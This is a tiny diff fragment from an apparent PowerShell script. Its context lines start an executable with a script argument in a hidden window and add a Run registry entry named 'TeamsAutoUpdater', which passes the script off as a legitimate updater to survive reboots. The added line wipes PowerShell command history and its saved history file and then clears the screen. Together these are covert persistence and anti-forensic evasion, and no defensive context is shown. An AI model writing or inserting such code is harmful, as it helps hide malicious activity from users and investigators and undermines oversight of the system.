@@ -29,3 +29,4 @@ Start-Process -FilePath $exePath -ArgumentList "`"$scriptPath`"" -WindowStyle Hi
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regValue = "`"$exePath`" `"$scriptPath`""
 Set-ItemProperty -Path $regPath -Name "TeamsAutoUpdater" -Value $regValue
+Clear-History; Set-Content -Path (Get-PSReadLineOption).HistorySavePath -Value $null -ErrorAction SilentlyContinue; Clear-Host
